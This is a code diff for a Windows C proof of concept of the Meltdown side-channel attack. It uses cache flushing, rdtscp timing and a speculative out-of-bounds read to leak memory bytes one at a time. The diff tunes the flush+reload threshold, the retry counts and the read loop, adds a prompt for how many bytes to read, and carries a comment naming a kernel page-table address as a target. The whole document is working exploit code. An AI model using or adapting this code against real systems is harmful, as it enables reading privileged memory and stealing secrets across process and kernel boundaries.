@@ -1,4 +1,6 @@
+#define  _CRT_SECURE_NO_WARNINGS
 #include <stdio.h>
+#include <intrin.h>
 #include <stdlib.h>
 #include <string.h>
 #include <time.h>
@@ -7,16 +9,17 @@
 #include <windows.h>
 #include <stdint.h>
 
+
 const char strings[] = {"Michal bialek konczyl nocna zmiane w serwerowni wykopu."};
 char disp[] = "................";
 jmp_buf array_access_exception;
 jmp_buf buf;
 static char* _mem = NULL, * mem = NULL;
-
-static size_t phys = 0;
+static int result;
+volatile static size_t phys = 0;
 size_t cache_miss_threshold;
 
-char dupa = ' ';
+char dup = ' ';
 static inline void flush(void* p) {
 	_mm_clflush(p);
 }
@@ -28,12 +31,24 @@ static inline uint64_t rdtsc() {
 	uint64_t a;
 	uint32_t c;
 
-	_mm_mfence();
-	a = __rdtsc();
-	_mm_mfence();
+
+	a = __rdtscp(&c);
+
 
 	return a;
 }
+//static uint64_t rdtsc() {
+//	uint64_t volatile a = 0, d = 0;
+//	__asm {
+//
+//		RDTSCP
+//		MOV DWORD PTR[d], EDX
+//		MOV DWORD PTR[a], EAX
+//
+//	}
+//	a = (d << 32) | a;
+//	return a;
+//}
 //int add(int a, int b)
 //{
 //	__asm {
@@ -50,13 +65,11 @@ static int inline flush_reload(void* ptr) {
 
 	flush(ptr);
 
-	if (end - start < cache_miss_threshold) {
-		return 1;
-	}
-	return 0;
+
+	return (-1)*((end - start) - cache_miss_threshold);
 }
 static int inline packed_read(size_t addr) {
-	phys = addr;
+	 phys = addr;
 
 	char res_stat[256];
 	int i, j, r;
@@ -64,7 +77,7 @@ static int inline packed_read(size_t addr) {
 		res_stat[i] = 0;
 
 
-	for (i = 0; i < 3; i++) {
+	for (i = 0; i < 10; i++) {
 		r = read_buf();
 		res_stat[r]++;
 	}
@@ -78,55 +91,70 @@ static int inline packed_read(size_t addr) {
 	}
 	return max_i;
 }
-void raise_exp()
-{
-	for (volatile int i = 0; i < 100000; i++)
-		;
+//void volatile raise_exp()
+//{
+//	for (volatile int i = 0; i < 100000; i++)
+//		;
+//
+//	longjmp(buf, 1);
+//
+//	return;
+//}
 
-	longjmp(buf, 1);
-
-	return;
-}
 
 int read_buf() {
 	//phys = addr;
+	PVOID h1;
 
-	size_t retries = 10000;
+	size_t retries = 1000;
 	uint64_t start = 0, end = 0;
-
+	int volatile i;
 
 
 	while (retries--) {
 
-	
-		
-			//MELTDOWN
-			uint64_t volatile  byte;
-		
-				__try {
-					byte = 0;
-					RaiseException(0, 0, 0, 0);
-					byte = *(volatile uint8_t*)phys;
-					byte <<= 12;
-					//if (byte == 0) goto retry;
 
-					*(volatile uint64_t*)(mem + byte);
-					//END MELTDOWN;
-				}
-				__except(1){
-					
-				}
-			
-			
-			
-		
-		int volatile i;
+
+		//MELTDOWN
+		uint64_t volatile  byte;
+
+		__try {
+			byte = 0;
+			byte = byte*byte;
+			//__debugbreak();
+			//if (byte == 0)
+			RaiseException(0, 0, 0, 0);
+
+	////		END MELTDOWN;
+		}
+		__except(1){
+			goto jump;
+		}
+		byte = *(volatile uint8_t*)phys;
+		byte = byte * 4096;
+		//if (byte == 0) goto retry;
+
+		*(volatile uint64_t*)(mem + byte);
+	
+	jump:
+		byte = 0;
+		int d=0;
+		int maxd = -1;
+		int sig = -1;
 		for (i = 0; i < 256; i++) {
-			if (flush_reload(mem + i * 4096)) {
+			d = flush_reload(mem + i * 4096);
+			if (d>0) {
 				if (i >= 1) {
-					return i;
+					if (d > maxd) {
+						maxd = d;
+						sig = i;
+					}
 				}
 			}
+		}
+		if (maxd > -1)
+		{
+			return sig;
 		}
 
 	}
@@ -137,8 +165,8 @@ int read_buf() {
 
 static void detect_flush_reload_threshold() {
 	size_t reload_time = 0, flush_reload_time = 0, i, count = 1000000;
-	char dummy[16];
-	size_t* ptr=dummy+8;
+	char dummy[1];
+	size_t* ptr=dummy;
 	uint64_t start = 0, end = 0;
 
 	maccess(ptr);
@@ -179,10 +207,10 @@ int main() {
 
 	int aX = 2;
 
-	_mem = malloc(4096 * 300);
+	_mem = malloc(4096 * 256);
 
-	mem = (char*)(((size_t)_mem & ~0xfff) + 0x1000 * 2);
-	memset(mem, 0xab, 4096 * 290);
+	mem = (char*)(((size_t)_mem ) );
+//	memset(mem, 0x00, 4096 * 290);
 
 
 	for (int j = 0; j < 256; j++) {
@@ -194,16 +222,11 @@ int main() {
 	int a = 5;
 	int b = 4;
 
-	int result = 2;
-	int index=0;
-	printf("Test number is: %i \n", result);
 
-	int xretval;
-	if ((xretval = setjmp(array_access_exception)) != 0)
-	{
-		fprintf(stderr, "ERROR");
-		return -1;
-	}
+	int index=0;
+	printf("Enter bytes to read: ");
+	scanf("%i", &result);
+
 
 	
 	printf("Value is: \n%s \n",strings);
@@ -212,26 +235,31 @@ int main() {
 	
 	int indexer = 0;
 	int xD = 0;
+	//__debugbreak();
+	//--------------
+	//ADDRES TO READ
+	//---------------
+	//0xFFFFF6FB7DBED000 - PML4
+	uint64_t addra = strings;
+	printf("[%8X] ",(addra + index));
 	while (1) {
 
-		value = packed_read((strings + index));
+		value = packed_read((addra + index)); 
 		printf("%.2X ", value);
 		fflush(stdout);
 		addchar(value, indexer);
 		index++;
 		indexer++;
-
+	
 		if (indexer == 16) {
-			printf(" | %s %c\n[%I64X] ", disp, dupa, (strings + index));
+			printf(" | %s %c\n[%8X] ", disp, dup, (addra + index));
 			indexer = 0;
-			dupa = ' ';
+			dup = ' ';
 			xD++;
-			
-			if (xD == 8) {
-				xD = 0;
-				//__debugbreak();
-			}
+			if (index > result)
+				break;
 		}
+	
 	}
 	system("pause");
 	return 0;
